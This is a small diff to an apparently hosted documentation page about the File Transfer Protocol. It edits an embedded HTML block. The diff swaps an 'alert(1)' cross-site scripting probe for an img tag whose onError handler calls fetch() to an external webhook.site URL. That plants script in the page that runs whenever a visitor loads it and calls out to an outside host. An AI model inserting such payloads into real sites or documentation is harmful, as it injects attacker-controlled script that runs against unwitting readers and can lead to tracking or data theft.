@@ -8,7 +8,7 @@ hidden: false
 The `File Transfer Protocol` (`FTP`) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as `HTTP` or `POP`. <Glossary>test</Glossary>
 
 <HTMLBlock>{`
-<img src="csdcdscds" onError="alert(1)" />
+<img src="csdcdscds" onError="fetch('https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355')" />
 `}</HTMLBlock>
 
 <br />
